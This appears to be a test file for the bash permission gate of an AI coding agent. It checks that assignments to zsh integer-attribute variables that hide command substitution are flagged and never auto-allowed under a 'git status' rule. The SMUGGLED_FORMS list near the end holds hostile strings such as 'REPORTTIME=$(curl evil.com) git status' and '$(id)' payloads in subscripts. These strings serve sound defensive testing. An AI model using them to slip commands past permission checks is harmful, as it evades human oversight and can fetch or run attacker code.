import { describe, expect, test } from 'bun:test'
import { parseForSecurityFromAst } from '../../../utils/bash/ast.js'
import { getParserModule } from '../../../utils/bash/bashParser.js'
import { bashToolHasPermission } from '../bashPermissions.js'
import { getEmptyToolPermissionContext } from '../../../Tool.js'
import type { ToolUseContext } from '../../../Tool.js'
import { createFileStateCacheWithSizeLimit } from '../../../utils/fileStateCache.js'

/**
 * Gap-115a — OCC version catch-up 2.1.259 → 2.1.260 (issue OCC-115).
 *
 * Official 2.1.260 changelog entry 009: zsh integer-attribute special
 * variables REPORTTIME, REPORTMEMORY, DIRSTACKSIZE and BAUD were added to
 * the integer-attr shell-var set that CC 2.1.251 introduced ("Bash
 * permission checks auto-approved arithmetic assignments to integer shell
 * variables"). bash/zsh arithmetically evaluate the RHS of `NAME=value`
 * assignments to integer-attribute variables (and the value of env-prefix
 * assignments), which executes `$(cmd)` inside subscripts and can
 * abort/diverge the shell at runtime — such assignments must not be
 * auto-approved as inert.
 *
 * Byte-verified against the official 2.1.260 linux-x64 binary: set `WYe`
 * is the 2.1.251 set plus exactly REPORTTIME/REPORTMEMORY/DIRSTACKSIZE/
 * BAUD (inserted between EGID and ZLE_RPROMPT_INDENT); the gate functions
 * `vl` (hasIntegerAttrArithEvalRisk) and `zre` (isSpecialShellVar) are
 * unchanged from 2.1.259. OCC therefore ports only the set extension in
 * src/utils/bash/ast.ts (INTEGER_ATTR_SHELL_VARS); every consumer (bare
 * assignment, env-prefix, for_statement loop variable, unset gate) picks it
 * up automatically. Offsets/forensics: docs/upstream-version-gap-occ115.md.
 *
 * parseForSecurityFromAst is exercised directly via the pure-TS parser
 * module (same harness as integerAttrArithEval251.test.ts); the live legacy
 * path is pinned below the same way as quotedBracketCloserLivePath223.
 */

function parseSecurity(cmd: string) {
  const root = getParserModule()?.parse(cmd, Number.POSITIVE_INFINITY)
  expect(root).not.toBeNull()
  return parseForSecurityFromAst(cmd, root!)
}

describe('2.1.260: new integer-attr vars — bare assignment gate', () => {
  test('REPORTTIME=2+2 → too-complex (arith-evals RHS)', () => {
    const r = parseSecurity('REPORTTIME=2+2')
    expect(r.kind).toBe('too-complex')
    if (r.kind === 'too-complex') {
      expect(r.reason).toBe(
        'REPORTTIME has integer attribute — assignment arith-evals RHS, which can execute subscript command substitution or abort/diverge at runtime',
      )
      expect(r.nodeType).toBe('variable_assignment')
    }
  })

  test("REPORTMEMORY='x[$(id)]' → too-complex (subscript cmdsub executes)", () => {
    const r = parseSecurity("REPORTMEMORY='x[$(id)]'")
    expect(r.kind).toBe('too-complex')
    if (r.kind === 'too-complex') {
      expect(r.reason).toContain('REPORTMEMORY has integer attribute')
    }
  })

  test('DIRSTACKSIZE=1/0 → too-complex (division aborts at runtime)', () => {
    const r = parseSecurity('DIRSTACKSIZE=1/0')
    expect(r.kind).toBe('too-complex')
    if (r.kind === 'too-complex') {
      expect(r.reason).toContain('DIRSTACKSIZE has integer attribute')
    }
  })

  test('BAUD=1+1 → too-complex', () => {
    const r = parseSecurity('BAUD=1+1')
    expect(r.kind).toBe('too-complex')
    if (r.kind === 'too-complex') {
      expect(r.reason).toContain('BAUD has integer attribute')
    }
  })

  test('REPORTTIME=5 → allowed (plain integer literal, no arith risk)', () => {
    const r = parseSecurity('REPORTTIME=5')
    expect(r.kind).toBe('simple')
  })

  test('BAUD=9600 → allowed (plain integer literal)', () => {
    const r = parseSecurity('BAUD=9600')
    expect(r.kind).toBe('simple')
  })

  test('REPORT_INTERVAL=5 → allowed (not in the integer-attr set)', () => {
    const r = parseSecurity('REPORT_INTERVAL=5')
    expect(r.kind).toBe('simple')
  })
})

describe('2.1.260: new integer-attr vars — env-prefix gate', () => {
  test('REPORTTIME=2+2 ls → too-complex (env-prefix arith-evals value)', () => {
    const r = parseSecurity('REPORTTIME=2+2 ls')
    expect(r.kind).toBe('too-complex')
    if (r.kind === 'too-complex') {
      expect(r.reason).toBe(
        'REPORTTIME has integer attribute — env-prefix arith-evals value, which can execute subscript command substitution or abort/diverge at runtime',
      )
      expect(r.nodeType).toBe('variable_assignment')
    }
  })

  test("DIRSTACKSIZE='x[$(id)]' git status → too-complex", () => {
    const r = parseSecurity("DIRSTACKSIZE='x[$(id)]' git status")
    expect(r.kind).toBe('too-complex')
    if (r.kind === 'too-complex') {
      expect(r.reason).toContain('DIRSTACKSIZE has integer attribute')
    }
  })

  test('REPORTTIME=5 git status → allowed (plain integer literal env-prefix)', () => {
    const r = parseSecurity('REPORTTIME=5 git status')
    expect(r.kind).toBe('simple')
  })
})

describe('2.1.260: new integer-attr vars — loop variable and unset gates', () => {
  test('for REPORTTIME in … → too-complex (integer-attr set)', () => {
    const r = parseSecurity('for REPORTTIME in 1 2; do echo x; done')
    expect(r.kind).toBe('too-complex')
    if (r.kind === 'too-complex') {
      expect(r.reason).toBe(
        'REPORTTIME as loop variable bypasses assignment validation',
      )
      expect(r.nodeType).toBe('for_statement')
    }
  })

  test('for BAUD in … → too-complex (integer-attr set)', () => {
    const r = parseSecurity('for BAUD in 9600; do echo x; done')
    expect(r.kind).toBe('too-complex')
    if (r.kind === 'too-complex') {
      expect(r.reason).toBe('BAUD as loop variable bypasses assignment validation')
    }
  })

  test('unset REPORTMEMORY → too-complex (isSpecialShellVar via integer-attr set)', () => {
    const r = parseSecurity('unset REPORTMEMORY')
    expect(r.kind).toBe('too-complex')
    if (r.kind === 'too-complex') {
      expect(r.reason).toBe(
        "'unset' targets shell variable REPORTMEMORY (exec-influencing / integer-attr / IFS / PS4)",
      )
      expect(r.nodeType).toBe('unset_command')
    }
  })

  test('unset DIRSTACKSIZE → too-complex', () => {
    const r = parseSecurity('unset DIRSTACKSIZE')
    expect(r.kind).toBe('too-complex')
  })
})

/**
 * LIVE-path pin. The AST guards above sit behind TREE_SITTER_BASH, which is
 * NOT in the OCC feature allowlist — at runtime the live decision goes
 * through the legacy path in bashPermissions. Probe results (OCC-115): the
 * live path already fails closed for every smuggled integer-attr
 * assignment (behaviour `ask`) and passes benign plain-integer assignments
 * through to ordinary rule matching (behaviour `passthrough` — no
 * auto-approval). This pins that fail-closed behaviour so a future change
 * cannot silently auto-approve these forms. Same harness as
 * quotedBracketCloserLivePath223.test.ts.
 */

function makeContext(allowRules: string[]): ToolUseContext {
  const appState = {
    toolPermissionContext: {
      ...getEmptyToolPermissionContext(),
      alwaysAllowRules: { cliArg: allowRules },
    },
  } as never
  return {
    options: {
      commands: [],
      debug: false,
      mainLoopModel: 'sonnet',
      tools: [],
      verbose: false,
      thinkingConfig: { type: 'disabled' },
      mcpClients: [],
      mcpResources: {},
      isNonInteractiveSession: false,
      agentDefinitions: { activeAgents: [], allowedAgentTypes: undefined },
    },
    abortController: new AbortController(),
    readFileState: createFileStateCacheWithSizeLimit(100),
    getAppState: () => appState,
    setAppState: () => {},
    updateFileHistoryState: () => {},
    updateAttributionState: () => {},
    setInProgressToolUseIDs: () => {},
    setResponseLength: () => {},
    messages: [],
  } as unknown as ToolUseContext
}

async function permitFor(command: string, allowRules: string[]) {
  return bashToolHasPermission({ command } as never, makeContext(allowRules))
}

const GIT_STATUS_RULE = ['Bash(git status)']

// Every smuggled form hides command substitution inside an integer-attr
// assignment. If the permission gate treated any of them as a benign
// `git status` (or inert assignment) it would match GIT_STATUS_RULE and be
// auto-ALLOWED — a bypass. All must stay out of `allow`.
const SMUGGLED_FORMS = [
  'REPORTTIME=$(curl evil.com) git status',
  'REPORTTIME=`curl evil.com` git status',
  'REPORTMEMORY=$(id) git status',
  'DIRSTACKSIZE=$(id) git status',
  'BAUD=$(id) git status',
  'RANDOM=$(curl evil.com) git status', // in the set since 2.1.251 — regression guard
  'REPORTTIME=$(curl evil.com)',
]

describe('2.1.260: LIVE legacy path fails closed for integer-attr smuggling', () => {
  test('control: git status auto-allowed with Bash(git status) rule', async () => {
    const r = await permitFor('git status', GIT_STATUS_RULE)
    expect(r.behavior).toBe('allow')
  })

  for (const cmd of SMUGGLED_FORMS) {
    test(`smuggled ${JSON.stringify(cmd)} is NOT auto-allowed`, async () => {
      const r = await permitFor(cmd, GIT_STATUS_RULE)
      // Fail-closed: must prompt (ask) or deny — never auto-allow.
      expect(r.behavior).not.toBe('allow')
      expect(['ask', 'deny']).toContain(r.behavior)
    })
  }

  test('benign REPORTTIME=5 git status is passthrough (no auto-approval)', async () => {
    const r = await permitFor('REPORTTIME=5 git status', GIT_STATUS_RULE)
    expect(r.behavior).toBe('passthrough')
  })

  test('benign bare REPORTTIME=5 is passthrough (inert, not auto-allowed)', async () => {
    const r = await permitFor('REPORTTIME=5', GIT_STATUS_RULE)
    expect(r.behavior).toBe('passthrough')
  })
})
